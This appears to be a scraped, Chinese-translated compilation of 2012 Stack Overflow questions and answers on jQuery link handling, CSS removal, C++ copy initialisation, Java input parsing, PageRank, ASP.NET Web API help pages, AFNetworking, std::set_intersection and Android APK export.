> 时间：2012-11-26T20:37:54.610
> 
> 标签：javascript, jquery

我的jsp中有以下锚标记

```
<a href="javascript:submit(this)">save</a>
<a href="javascript:alert(this)">something</a> 
```

我需要停止默认的 href 行为，但在 onclick 时调用这些函数。同样，我写了这段代码：

```
$('a[href^=\'#\']').live("click", function (e) {
   alert("I am being called #");
   e.preventDefault();
   return false;
});

$(document).ready(function(){
      $("a[href^='javascript']").each(function(){
            alert("replacing");
            var w=$(this).attr('href');

            $(this).attr('href','#');

            $(this).attr("onclick",w);
   });
}); 
```

但是，单击链接时不会调用这些函数。你能告诉我哪里出错了。我正在使用 IE 8。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T21:28:29.090

尝试这个：

```
$(document).on("click", "a[href^=\'#\']",function (e) {
   alert("I am being called #");
   e.preventDefault();
   return false;
});

$(document).ready(function(){    
      $("a[href^='javascript']").attr('href','#');    
}); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-10-31T07:40:08.507

```
$(document).ready(function() {
  var mydiv = document.getElementById("myDiv");
  var aTag = document.createElement('a');
  aTag.setAttribute('href', "#");
  aTag.setAttribute('id', "tagId");
  aTag.innerHTML = "link text";

  mydiv.appendChild(aTag);

  $("#tagId").on('click', function(e) {
    alert(1)

  });
});
```

# javascript - 使用 jQuery 或任何其他方法删除样式

> ID：13572750
> 
> 赞同：2
> 
> 时间：2012-11-26T20:38:01.497
> 
> 标签：javascript, jquery, css

我真的需要你的专家帮助！

我正在制作一个展示 HTML 电子邮件的网站。因此，我需要从特定 div 中删除所有样式，以便我可以从电子邮件中复制和粘贴 HTML。这将保持电子邮件的原始设计。

我在[这里](http://www.newsletter-examples.com/test/)设置了一个测试页面并尝试使用 jQuery 中的 removeAttr ，但它似乎不起作用。

我对 HTML 和 CSS 编码很好，但 javaScript 对我来说是新的，所以任何非常清晰的例子都会很棒。

顺便说一句，我没有挂断 jQuery。任何能完成这项工作的东西都会很棒！

先谢谢各位了

布伦丹。

这是 JavaSript 和 HTML

```
<link rel='stylesheet' id='style-css'  href='css/style.css' type='text/css' media='all' />
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js" type="text/javascript"></script>

</head>

<body>
    <script type='text/javascript'>
        $(document).ready(function() {
    $('h1').removeAttr('style');
    });
</script>
<p>This is a paragraph tag.</p>
<h1>This is a H1 tag.</h1>
<div>
    <p>This is a p tag inside a styled div.</p>
    <table width="200" border="1">
    <tr>
        <td>1</td>
        <td>2</td>
        <td>3</td>
    </tr>
    <tr>
        <td>4</td>
        <td>5</td>
        <td>6</td>
    </tr>
    <tr>
        <td>7</td>
        <td>8</td>
        <td>9</td>
    </tr>
</table>
</div>
</body>
</html> 
```

这是CSS

```
table, th, td {
    border: 1px solid #CCCCCC;
}
table {
    margin-bottom: 1.5em;
    max-width: 100%;
    width: 100%;
}
table {
    border-collapse: collapse;
    border-spacing: 0;
}
p, address {
margin-bottom: 1.5em;
font-size:19px;
}
h1{
    border-bottom: 5px solid #666666;
}
h1{
    font-family: "Oswald";
    line-height: 1.5;
    margin: 0 0 0;
    padding-bottom: 0.3em;
    text-transform: lowercase;
}
h1{
    font-size: 2em;
    line-height: 1;
    margin-bottom: 1em;
}
h1, h2, h3, h4, h5, h6 {
    clear: both;
    font-size: 100%;
    font-weight: normal;
}
div{
    background-color:#9F0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:42:13.003

```
jQuery(function($) {
    $("style, link[rel=stylesheet]").remove();
    $("*").removeAttr("style");
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:46:41.703

我建议使用 iframe 将您的页面与电子邮件中的 html 隔离开来。如果您从与父页面不同的域中提供电子邮件模板内容，那么恶意内容影响您网站的范围就会更小。

像这样的东西：

```
<!-- in http://www.company.com/templates/123 -->

<iframe src="http://www.usercontent.com/templates/123.html"></iframe> 
```

如果没有跨域屏障，如果有人设法在模板内执行 javascript，那么它将无法继续窃取您用户的 cookie。然后作为奖励，由于内容将位于不同的页面中，因此不同页面之间的 CSS 混合不会有任何问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:42:05.943

我认为您需要的是javascript：

```
document.getElementById('your_div').style='';
document.getElementById('your_div').setAttribute("class",""); 
```

# c++ - 私有复制构造函数和带一个参数的构造函数

> ID：13572757
> 
> 赞同：0
> 
> 时间：2012-11-26T20:38:40.060
> 
> 标签：c++

为什么这段代码无法编译？如果我将复制构造函数访问级别更改为公共，就可以并打印“Foo::Foo(int)”。如果我写“Foo instance(0);” 而不是“Foo instance = 0;” 它也会好的。为什么？这种行为的意义何在？

```
#include <iostream>

struct Foo
{
public:
   int i;
   Foo(int i) : i(i) { std::cout << "Foo::Foo(int) \n"; }

private:
   Foo(const Foo&) { std::cout << "Foo::Foo(const Foo&) \n"; }
};

int main()
{
   Foo instance = 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:41:44.180

`Foo instance = 0;`使用复制初始化。使用非显式构造函数将其转换为对象，`0`然后将其复制到 make 。它相当于：`Foo``Foo(int i)``instance`

```
Foo instance = Foo(0); 
```

这需要您将其设为私有的复制构造函数。

当您将其公开时，转换构造函数打印但复制构造函数不打印的原因是因为编译器可以省略副本以进行优化。这是一种可能会改变代码执行的优化形式。然而，复制构造函数仍然需要是公共的，无论它是否被省略。换句话说，副本需要在被删除之前成为可能。

如果您进行转换构造函数`explicit`，它将无法编译：

```
explicit Foo(int i) : i(i) { std::cout << "Foo::Foo(int) \n"; } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:39:20.500

因为

```
Foo instance = 0; 
```

是**复制初始化**，需要一个可访问的复制构造函数。它尝试使用转换构造函数从临时创建一个`Foo`，`0`然后使用复制构造函数`instance`从临时创建。`Foo`

相比之下，

```
Foo instance(0); 
```

是**直接初始化**，只需要转换构造函数。

相关：[复制和直接初始化行为不同的背后动机是什么？](https://stackoverflow.com/questions/11223285/whats-the-motivation-behind-having-copy-and-direct-initialization-behave-differ)

# jquery - 将多个 UL 合并为一个 UL

> ID：13572760
> 
> 赞同：5
> 
> 时间：2012-11-26T20:38:53.107
> 
> 标签：jquery

如何将多个`ul`s 合并为一个`ul`？

例如，我如何结合以下内容。

```
<ul>
 <li>one</li>
 <li>two</li>
</ul>

<ul>
 <li>three</li>
</ul>

<ul>
 <li>four</li>
</ul>

<ul>
 <li>five</li>
</ul> 
```

对于这样的事情

```
<ul>
  <li>one</li>
  <li>two</li>
  <li>three</li>
  <li>four</li>
  <li>five</li>
</ul>
​ 
```

​</p>

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-26T20:40:18.650

最棒的[`.append()`](http://api.jquery.com/append)地方[`.appendTo()`](http://api.jquery.com/appendTo)在于它们会移动现有的 DOM 元素，而不是像你想象的那样复制它们：

```
$('ul').children('li').appendTo('ul:first'); // move all LIs to the first UL
$('ul').not(':first').remove(); // delete the extra ULs 
```

根据需要自定义`'ul'`选择器；我建议使用通用类而不是通用标签选择器。

[http://jsfiddle.net/j76Lu/](http://jsfiddle.net/j76Lu/)

稍微优化（感谢，[adeneo](https://stackoverflow.com/a/13572859/901048)）：

```
$('ul').not(':first').remove().children('li').appendTo('ul:first'); 
```

[​http://jsfiddle.net/j76Lu/1/](http://jsfiddle.net/j76Lu/1/)

甚至更好：

```
$('ul:gt(0)').remove().children('li').appendTo('ul:eq(0)'); 
```

[​http://jsfiddle.net/j76Lu/2/](http://jsfiddle.net/j76Lu/2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:45:00.070

```
$('<ul />').append($('ul').remove().children('li')).appendTo('body'); 
```

[**小提琴**](http://jsfiddle.net/4cRYf/) ​</p>

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:45:30.010

```
var newUl = $('<ul>');    
$('ul').each(function() { 
       $(this).find('li').each(function() { 
            newUl.append($(this))
       });
       $(this).remove();
    });
$('selector').append(newUl); 
```

# java - 计算以空格分隔的输入数字

> ID：13572761
> 
> 赞同：0
> 
> 时间：2012-11-26T20:39:01.107
> 
> 标签：java, string, count, split, java.util.scanner

我不知道如何处理以下问题。

我有一个输入供用户输入，他们可以输入用空格分隔的各种数字，例如（20 30 89 ..）我需要计算输入了多少数字（在这种情况下输入了 3 个数字）我会怎么做?

我假设这背后的逻辑类似于计算空格数并向其添加 1（其前面没有空格的初始数字），但我不确定如何通过代码执行此操作。最好检查是否在第一个数字之前输入了空格，如果是，则不要将 + 1 添加到最终计数中，还要检查诸如双空格、三空格等内容并将它们计为一个空格。最后看看最后是否没有空格（所以不加起来）。

这是我到目前为止所得到的（用户输入）：

```
package temperature;

import java.util.*;

/**
 * @author --
 */
public class Histogram {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {

        // Input for grades
        Scanner input = new Scanner(System.in);
        System.out.println("Enter temperatures below (separated by spaces e.g. 20 30 89 ..)");
        int temperature = input.nextInt();
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:41:34.350

*   只需阅读使用`Scanner#nextLine()`方法的完整行。
*   将读取行拆分为一个或多个`spaces`-`+`为此使用量词
*   然后得到得到的长度`array`。

这是一个例子： -

```
if (scanner.hasNextLine()) {
    int totalNumbers = scanner.nextLine().split("[ ]+").length;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T21:38:29.690

如果只计算空格，则最终可能会以数字形式出现任何垃圾数据。我的建议是阅读所有输入，直到你到达一个空格字符。如果转换失败，则尝试将其转换为整数（或双精度），对无效输入进行错误处理，否则增加计数器。

一个例子是这样的：

```
// Sample input used.
    String input = "23 54 343 75.6 something 22.34 34 whatever 12";
    // Each number will be temporarily stored in this variable.
    Double numberInput;
    // Counter used to keep track of the valid number inputs.
    int counter = 0;
    // The index directly after the number ends.
    int endIndex = 0;
    // Now we simply loop through the string.
    for (int beginIndex = 0; beginIndex < input.length(); beginIndex = endIndex + 1) {
        // Get the index of the next space character.
        endIndex = input.indexOf(" ", beginIndex);
        // If there are no more spaces, set the endIndex to the end of the string.
        if (endIndex == -1) {
            endIndex = input.length();
        }
        // Take out only the current number from the input.
        String numberString = input.substring(beginIndex, endIndex);
        try {
            // If the number can be converted to a Double, increase the counter.
            numberInput = Double.parseDouble(numberString);
            counter++;
        } catch (java.lang.NumberFormatException nfe) {
            // Some error handling.
            System.err.println("Invallid input: " + numberString);
        }
    }
    System.out.println("Total valid numbers entered: " + counter); 
```

输出：

```
Invalid input: something
Total valid numbers entered: 7
Invalid input: whatever 
```

编辑：抱歉，我打开了答案窗口，没有看到其他回复。拆分功能应该做得很好:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:41:59.727

您可以按空格拆分它并计算元素的数量：

```
 System.out.println("20".split (" ").length);
    System.out.println("20 30".split (" ").length); 
```

这将分别打印 1 和 2。

这是一个[小提琴](http://ideone.com/zlEzPj)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-29T14:49:26.537

如果您可以将输入作为字符串然后从字符串中检索数字会更好。

```
Scanner input=new Scanner(System.in);
String st=input.nextLine();
String[] split=st.split(" ");
ArrayList<Integer> temp=new ArrayList<>();
String regex="^[0-9]+$";
     for(int i=0;i<split.length;i++)
     {
         if(split[i].matches(regex)) temp.add(Integer.parseInt(split[i]));
     } 
```

现在你得到了所有的温度作为`ArrayList<Integer>`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-01T21:32:00.190

这是我的解决方案。它比使用 Split 方法的解决方案要长一点，但它只会在结果中包含数值。所以对于以下输入：

```
12 32 234 555 24 sdf 4354 dsf34r34 rfedfg 4353 
```

该函数将在数组中返回以下值：

```
12
32
234
555
24
4354
4353 
```

这是功能：

```
private static String[] getWholeNumbers(String input) {
    ArrayList<String> output = new ArrayList<String>();

    Pattern pattern = Pattern.compile("\\b\\d+\\b");
    Matcher matcher = pattern.matcher(input);
    while (matcher.find()) {
        output.add(matcher.group());
    }
    return output.toArray(new String[output.size()]);
} 
```

如果您只需要计数，也可以轻松更改该功能以执行此操作。

# algorithm - 对页面排名的怀疑

> ID：13572763
> 
> 赞同：5
> 
> 时间：2012-11-26T20:39:17.173
> 
> 标签：algorithm, hadoop, mapreduce, pagerank

我正在尝试使用 Mapreduce 查找 Wikipedia 的内部页面排名。我在一小部分维基页面上实现了我的 Pagerank 算法。共有**6349**页。我使用这个公式来计算 pagerank (d = 0.85)。

![在此处输入图像描述](../Images/3e25c12cff36a012959af0a45ba51344.png)

我想验证**所有 pagerank 的总和是否等于总页数**（6349）。

到目前为止我发现了什么：

1.所有6349个页面的总页面排名为**1001.26044**

2.根据[维基百科](http://en.wikipedia.org/wiki/PageRank)，如果我使用上面的公式，那么*`each PageRank is multiplied by N and the sum becomes N`*。我将每个页面排名乘以 N (6349) 并计算总和，我得到**6356789.5**。

页面排名之和不等于总页数是否有原因？我应该使用第二个公式来验证吗？

![在此处输入图像描述](../Images/e1f52e2635acaa0ff67347108620877c.png)

注意：我运行我的 mapreduce 代码 10 次迭代以获得良好的近似值。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-27T09:40:51.357

我想，你的迭代太少了。为什么是10？为什么是100？还是100000？你应该数一数，最后两个变化的中位数或最大值是多少。从而评估可能的错误。

PR是一个概率。它们的总和应该是1！“所有pagerank之和等于总页数”这句话是错误的。

至于另一个公式，它属于另一个模型和另一个 PR。当然，您也可以使用它。或两者。但是你不能检查使用它。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-01-27T22:01:38.413

这取决于您选择的基数（默认值为 1）。每次迭代后，您必须计算

```
delta = (base - sum_of_ranks) / N 
```

然后按增量减少每个等级。只有这样，您才能使您的排名保持活力，直到最后一次迭代结束。

# c# - 将 Web API 和 API 文档添加到现有 MVC 项目

> ID：13572769
> 
> 赞同：11
> 
> 时间：2012-11-26T20:39:39.110
> 
> 标签：c#, asp.net-web-api

我已成功将 a 添加`web api controller`到现有`MVC4`应用程序中。

我想拥有新的 web api 示例中提供的 api 文档功能`(ex. http://sample.hostname.com/help)`。我相信这些使用`ApiExplorer`类。我尝试将该区域复制`HelpPage`到我的项目中，但出现错误

> “无法构造字符串类型。您必须配置容器以提供此值”

当我尝试导航以寻求帮助时。

我必须怎么做才能添加 API 的自动化文档？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-09-19T01:37:39.683

正如其他人已经说过的，您必须先安装 NuGet 包`Microsoft.AspNet.WebApi.HelpPage`。这将在您的应用程序中创建一个新的 HelpPage 区域，其中包含显示文档所需的视图、模型和控制器。

但是，生成的 HelpController 包含一个重载的构造函数：

```
public HelpController(HttpConfiguration config)
{
    Configuration = config;
} 
```

这似乎不适用于 Unity（或者可能是任何类型的 DI 容器）。你得到这个错误：

```
[InvalidOperationException: The type String cannot be constructed. You must configure the container to supply this value.] 
```

删除此重载，它应该可以工作。

也刚刚找到了另一个参考： http: [//www.stefan-scheller.com/2013/08/the-type-string-cannot-be-constructed-web-api-with-unity/](http://www.stefan-scheller.com/2013/08/the-type-string-cannot-be-constructed-web-api-with-unity/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-12-01T13:58:58.390

V5.2.2 有以下代码：

```
public HelpController()
        : this(GlobalConfiguration.Configuration)
    {
    }

    public HelpController(HttpConfiguration config)
    {
        Configuration = config;
    } 
```

在帮助控制器中

Unity 使用具有最多参数的构造函数，因此为了让它使用无参数构造函数，我将第二个重载更改为受保护：

```
 protected HelpController(HttpConfiguration config)
    {
        Configuration = config;
    } 
```

帮助页面又回来了

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-09-15T19:02:03.820

我的假设是要求为 Web API 端点提供自动化文档，而不是 MVC 端点。基于这个假设，我构建了一个按预期工作的 POC，如果需要，我可以随时通过电子邮件向您发送 zip :)。

1.  构建一个新的 MVC 4 Internet 应用程序。这将生成 Home 和 Account 控制器、匹配视图和 MVC 路由。

2.  通过在包管理器的在线部分中搜索“HelpPage”来添加 Microsoft.AspNet.WebApi.HelpPage 包。

3.  为您的 Web API 控制器添加一个名为“Api”的新文件夹。这是由您在 WebApiConfig.cs 的 Register 方法中设置的 WebApi 路由驱动的。我的如下：

    ```
    public static void Register(HttpConfiguration 
    {
        config.Routes.MapHttpRoute(
            name: "DefaultApi",
            routeTemplate: "api/{controller}/{id}",
            defaults: new { id = RouteParameter.Optional });
    } 
    ```

4.  构建项目。点击端点/帮助。它吐出我的 api 控制器中的所有端点（一个 get 和一个 post 端点）。

这不需要对通过添加 HelpPages 包生成的区域文件夹进行任何更改。它所需要的只是在文件夹中添加一个新的 Api 文件夹和一个新的 Api 控制器（空），并在新控制器中快速构建两个端点。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-09-16T11:46:14.177

我之前可以确认答案 - HelpPage 确实会拾取任何控制器，无论它位于何处，如果它匹配路由并继承自 ApiController。

我花了几个小时追捕这个。我想，一定是我添加到项目中的东西弄乱了我的路由/API。所以我在安装/卸载各种 Nuget 包数小时后找到了它。我的项目的问题是我安装了[Glimpse.Mvc4](http://getglimpse.com/)包。这个包以某种方式阻止了[ApiExplorer](http://msdn.microsoft.com/en-us/library/system.web.http.description.apiexplorer%28v=vs.108%29.aspx)获取我的 API。这显然是 Glimpse.Mvc4（或 Glimpse.AspNet）包中的错误或 ApiExporer 中的错误[（](http://msdn.microsoft.com/en-us/library/system.web.http.description.apiexplorer%28v=vs.108%29.aspx)我没有费力找出错误是什么）。

我会将此事报告给 Glimpse 团队。在此处发布此答案可能也会对其他人有所帮助。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-20T13:59:24.353

1.  在 NuGet 包管理器中，在 Online 包中搜索“helppage”。
2.  安装它（它会不断更新，即使您拥有最新的 .net，它也能满足您的所有需求）
3.  在将添加一个区域并在其中创建您需要的所有必要文件。在 [your_root]/Help 下构建并测试它
4.  在此观看[Yao 博客](http://blogs.msdn.com/b/yaohuang1/archive/2012/08/15/introducing-the-asp-net-web-api-help-page-preview.aspx)上的视频，以快速了解如何自定义它。视频有点老了，还有效。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-26T21:24:15.920

查看 Yao 的关于帮助页面的博客：

[http://blogs.msdn.com/b/yaohuang1/](http://blogs.msdn.com/b/yaohuang1/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-06-27T05:39:45.780

我刚遇到这个问题。这对我来说是这样的。

我在以前的项目（使用 MVC 5 和 Web API 2）上有帮助页面，所以我知道它在我的新项目中有所不同。结果在旧（工作）项目中，我只在 WebApi 控制器中进行 DI，而不是 MVC 控制器。我在 MVC 控制器中不需要 DI，所以我只是注释掉了引导 UnityDependencyResolver 作为 MVC 依赖解析器的代码（在我的例子中是 UnityMvcActivator 类）。

显然，这不是每个人的选择，但如果不是，@Adrian Brown 的答案看起来是你最好的选择，直到这个问题得到解决。

# iphone - 使用 AFNetworking 并收到错误 404

> ID：13572770
> 
> 赞同：0
> 
> 时间：2012-11-26T20:39:47.690
> 
> 标签：iphone, ios, phpmyadmin, xampp

这是我的第一次尝试，我正面临错误

```
Expected status code in (200-299), got 404 
```

我正在关注本教程>[链接](http://www.raywenderlich.com/13511/how-to-create-an-app-like-instagram-with-a-web-service-backend-part-12)

我已经创建了下面的类：

TalkToNetwork.h

```
#import "AFHTTPClient.h"
#import "AFNetworking.h"

typedef void (^JSONResponseBlock)(NSDictionary* json);

@interface TalkToNetwork : AFHTTPClient

@property (strong, nonatomic) NSDictionary* user;

-(BOOL)isAuthorized;

-(void)commandWithParams:(NSMutableDictionary*)params onCompletion:(JSONResponseBlock)completionBlock;

+(TalkToNetwork*)sharedInst;

@end 
```

TalkToNetwork.m

```
 #import "TalkToNetwork.h"

//the web location of the service
#define kAPIHost @"http://localhost/"
#define kAPIPath @"Test/"

@implementation TalkToNetwork

@synthesize user;

+(TalkToNetwork*)sharedInst{

    static TalkToNetwork *sharedInstance = nil;
    static dispatch_once_t oncePredicate;
    dispatch_once(&oncePredicate, ^{
        sharedInstance = [[self alloc] initWithBaseURL:[NSURL URLWithString:kAPIHost]];

    });

    return sharedInstance;
}

-(BOOL)isAuthorized{

    return [[user objectForKey:@"IdUser"] intValue] > 0;
}

-(void)commandWithParams:(NSMutableDictionary*)params onCompletion:(JSONResponseBlock)completionBlock{

    NSMutableURLRequest *apiRequest =
    [self multipartFormRequestWithMethod:@"POST"
                                    path:kAPIPath
                              parameters:params
               constructingBodyWithBlock: ^(id <AFMultipartFormData>formData) {
               }];

    AFJSONRequestOperation* operation = [[AFJSONRequestOperation alloc] initWithRequest: apiRequest];
    [operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject) {
        //success!
        printf("success");
        completionBlock(responseObject);
    } failure:^(AFHTTPRequestOperation *operation, NSError *error) {
        //failure :(
        printf("failure");
        completionBlock([NSDictionary dictionaryWithObject:[error localizedDescription] forKey:@"error"]);
    }];

    [operation start];
}

-(TalkToNetwork*)init{

    self = [super init];

    if (self != nil) {
        user = nil;

        [self registerHTTPOperationClass:[AFJSONRequestOperation class]];

        [self setDefaultHeader:@"Accept" value:@"application/json"];
    }

    return self;
}

@end 
```

我已经下载并安装了 XAMPP 作为教程建议，运行所有三个控件（Apache、MySQL、FTP），并且我已经使用`phpmyadmin`它来手动创建数据库和表（“登录”）。

我正在按照教程中的每个步骤进行操作，但仍然出现上述错误。此外，我手动将链接传递给浏览器“http://localhost/Test/”并收到错误 404。我在这里缺少什么？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T10:19:09.650

您传入的 URL 无效。在浏览器中检查 URL ..

1.  检查 Apache 是否运行在`http//localhost/`or `http://172.0.0.1/`or ..`http://localhost:8080/`
2.  检查 PHP 是否运行良好`http://localhost/test/index.php`
3.  ...

**UPD**

来自教程：

> “解压后的 ZIP 应该包含几个 PHP 文件和一个名为“upload”的文件夹。主要 API 文件是 index.php”

... 然后.. ”

> 将 Finder 中的文件复制到您的网络文件夹”

...

> “如果您有任何设置，而不是从本地计算机调用 API，则必须更改域和路径”

也许..你必须尝试`http://localhost/xampp/test/`

**UPD2**

错误 403 访问被禁止：

**1** a) 在 Finder 中选择测试文件夹 b) 选择“显示信息” c) 在“所有权和权限”下检查您是否具有读\写权限

**2** 检查\修改您的 httpd.conf 从“拒绝所有人”到“订购允许”和“所有人允许” -[就像这里](http://www.dclawson.com/2010/03/xampp-access-forbidden/)

# c++ - 由于为集合容器选择错误的输出迭代器导致的编译错误

> ID：13572773
> 
> 赞同：1
> 
> 时间：2012-11-26T20:40:04.063
> 
> 标签：c++

```
template < class ProteinTypeInfo >
 class T_PP_edge{
 private:
   std::pair<ProteinTypeInfo, ProteinTypeInfo> paired_info;
   unsigned priority;

public:
 // the constructor stores the Protein types in lexico ordering
    T_PP_edge(ProteinTypeInfo one, ProteinTypeInfo two){
    if (one<two) {paired_info.first = one; paired_info.second = two; } 
    else         {paired_info.first = two; paired_info.second = one; }
    priority = 0;
    }

  T_PP_edge& operator=(T_PP_edge& other){
   priority = other.priority;
   paired_info.first = other.paired_info.first;
   paired_info.second = other.paired_info.second;
   return *this ;
   }

   bool operator<(const T_PP_edge& a)const{
     if((*this).paired_info.first < a.paired_info.first) return true;
     else if((*this).paired_info.second < a.paired_info.second) return true;
     else return false;
   }

  const std::pair<ProteinTypeInfo, ProteinTypeInfo>& get_paired_info()const{
    return paired_info;}

 unsigned get_priority()const{return priority;}
 void set_priority(unsigned p) {priority = p;}
 };

// The lexico ordering used to compare pairs of proteins

template < class ProteinTypeInfo >
struct T_PP_edge_lexico_cmp{
public:
 typedef T_PP_edge<ProteinTypeInfo> PP_edge;
 bool operator()(const PP_edge& a, const PP_edge& b)const{
 if(a.get_paired_info().first < b.get_paired_info().first) return true;
 else if(a.get_paired_info().second < b.get_paired_info().second) return true;
 else return false;
 }

};

typedef std::string Protein_type;
typedef T_PP_edge<Protein_type> PP_edge;
typedef T_PP_edge_lexico_cmp<Protein_type> PP_edge_lexico_cmp;

int main(){
  typedef std::set<PP_edge, PP_edge_lexico_cmp> Edge_set;
  typedef Edge_set::iterator set_iterator;
  Edge_set edgeP_set, edgeR_set;
  PP_edge e1("aa", "bb"), e2("aa", "cc"), e3("bb", "cc");
  PP_edge e4("aa", "dd"), e5("aa", "cc"), e6("bb", "cc");
  edgeP_set.insert(e1); edgeP_set.insert(e2); edgeP_set.insert(e3);
  edgeR_set.insert(e4); edgeR_set.insert(e5); edgeR_set.insert(e6);
  Edge_set result;
  std::set_intersection(edgeP_set.begin(), edgeP_set.end(), edgeR_set.begin(), 
  edgeR_set.end(), result.begin());
  set_iterator itb = result.begin(), ite = result.end();

  for(; itb != ite; ++itb)
     std::cout << itb->get_paired_info().first << "-" << itb->get_paired_info().second <<  "\n";

  return 0;
  } 
```

注意：包括 set_intersection 函数的算法。

上面的代码在编译时出现以下错误：

```
g++ test_code.cpp
In file included from /usr/lib/gcc/i686-redhat-linux/4.5.1/../../../../include/c++/4.5.1/algorithm:63:0,
                 from test_code.cpp:4:
/usr/lib/gcc/i686-redhat-linux/4.5.1/../../../../include/c++/4.5.1/bits/stl_algo.h: In function ‘_OIter std::set_intersection(_IIter1, _IIter1, _IIter2, _IIter2, _OIter) [with _IIter1 = std::_Rb_tree_const_iterator<T_PP_edge<std::basic_string<char> > >, _IIter2 = std::_Rb_tree_const_iterator<T_PP_edge<std::basic_string<char> > >, _OIter = std::_Rb_tree_const_iterator<T_PP_edge<std::basic_string<char> > >]’:
test_code.cpp:79:111:   instantiated from here
/usr/lib/gcc/i686-redhat-linux/4.5.1/../../../../include/c++/4.5.1/bits/stl_algo.h:5648:6: error: no match for ‘operator=’ in ‘__result.std::_Rb_tree_const_iterator<_Tp>::operator* [with _Tp = T_PP_edge<std::basic_string<char> >, const _Tp& = const T_PP_edge<std::basic_string<char> >&]() = __first1.std::_Rb_tree_const_iterator<_Tp>::operator* [with _Tp = T_PP_edge<std::basic_string<char> >, const _Tp& = const T_PP_edge<std::basic_string<char> >&]()’
test_code.cpp:21:14: note: candidate is: T_PP_edge<ProteinTypeInfo>& T_PP_edge<ProteinTypeInfo>::operator=(T_PP_edge<ProteinTypeInfo>&) [with ProteinTypeInfo = std::basic_string<char>, T_PP_edge<ProteinTypeInfo> = T_PP_edge<std::basic_string<char> >]

Compilation exited abnormally with code 1 at Mon Nov 26 21:28:38 
```

我怀疑这可能是由于赋值运算符中的 const 不正确。请帮帮我。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:53:35.260

`result.begin()`不是预期的 OutputIterator `set_intersection`。

采用

```
std::inserter(result, result.end()) 
```

即使`result.begin()`可以解决，它通常也只是段错误。`std::vector`在不保留足够内存的情况下尝试使用 a 。

并且，为了您的读者，请：摆脱空白。使用有意义的空格来显示程序的逻辑流程。

另外，你`operator=`是不必要的。它与默认生成的相同。

# jquery - 将 jquery 灯箱转换为用户标记的画廊添加

> ID：13572774
> 
> 赞同：0
> 
> 时间：2012-11-26T20:40:05.710
> 
> 标签：jquery

我有一个关于如何重写使用 jquery 的灯箱脚本的问题。

它使用 div id 来区分画廊。我想让它使用该`rel=""`属性，可能带有一个尾随数字。可以这样写来检查诸如`rel="gallery1"`但在增加数字的循环内的东西吗？我不熟悉此类事情的 js 语法。或者可能是一个循环检查具有该 rel 的对象的 dom。谢谢。

**Javascript**

```
$(function() {
    $('#gallery1 a').lightBox();
    $('#gallery2 a').lightBox();
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T22:29:34.113

这将通过 for 循环 3 次调用`.lightBox()`带有`rel`of`gallery1`和`gallery2`的链接`gallery3`。您可以将循环数增加到您想要的任意数量。

**Javascript**

```
for (x = 1; x <= 3; x += 1) {
    $('a[@rel*=gallery' + x + ']').lightBox();
}​ 
```

尽管我认为您可以通过指定不同的`rel`属性并调用`.lightBox()`所有链接来对灯箱进行分组。

为您的所有灯箱链接指定一个类别，`lightbox`然后为所有链接指定不同的`rel`组，例如`gallery1`,`gallery2`和`gallery3`。然后调用以下，我认为`.lightBox()`它们都应该单独分组。

**HTML**

```
<a href="[image_src]" class="lightbox" rel="gallery1">[link text or thumbnail]</a>
<a href="[image_src]" class="lightbox" rel="gallery1">[link text or thumbnail]</a>
<a href="[image_src]" class="lightbox" rel="gallery1">[link text or thumbnail]</a>

<a href="[image_src]" class="lightbox" rel="gallery2">[link text or thumbnail]</a>
<a href="[image_src]" class="lightbox" rel="gallery2">[link text or thumbnail]</a>

<a href="[image_src]" class="lightbox" rel="gallery3">[link text or thumbnail]</a>
<a href="[image_src]" class="lightbox" rel="gallery3">[link text or thumbnail]</a>
<a href="[image_src]" class="lightbox" rel="gallery3">[link text or thumbnail]</a> 
```

**Javascript**

```
$('a.lightbox').lightBox(); 
```

应该发生的是`gallery1`链接组在一起，`gallery2`链接组在一起，`gallery3`链接组在一起。这应该默认发生。

我希望这有帮助。

**编辑 1**

需要注意的是，jQuery 灯箱插件已经 4.5 年没有更新了。您可能希望查看维护更好的替代方案，例如[colorbox](http://www.jacklmoore.com/colorbox)。

# android - 使用eclipse生成apk文件以将应用程序提交到亚马逊的最佳方法是什么？

> ID：13572789
> 
> 赞同：1
> 
> 时间：2012-11-26T20:40:46.890
> 
> 标签：android, amazon, kindle

使用 Eclipse 生成 apk 文件以将我的应用程序提交到亚马逊的最佳方法是什么？

我尝试使用 Android 工具 -> 导出未签名的应用程序包...但是当我通过电子邮件将 apk 发送到我的 Kindle Fire 并尝试安装它时，安装失败并显示“应用程序安装失败”

